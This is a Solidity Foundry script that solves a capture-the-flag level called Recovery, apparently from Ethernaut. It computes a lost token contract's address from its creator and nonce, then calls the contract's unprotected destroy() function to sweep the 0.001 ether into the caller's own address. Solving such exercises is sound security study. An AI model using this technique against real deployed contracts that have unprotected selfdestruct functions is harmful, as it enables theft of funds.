/*
A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. 
After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.




*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Recovery} from "src/Recovery.sol";
import {SimpleToken} from "src/Recovery.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract RecoverySolution is Script {
    Recovery public recovery = Recovery(0x66542dfC51165004acb46C260EF3290Db09DF5c2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        SimpleToken(payable(getTheAddress())).destroy(payable(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }

    // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
    function getTheAddress() public view returns (address) {
        return address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6), bytes1(0x94), 0x66542dfC51165004acb46C260EF3290Db09DF5c2, bytes1(0x01)
                        )
                    )
                )
            )
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
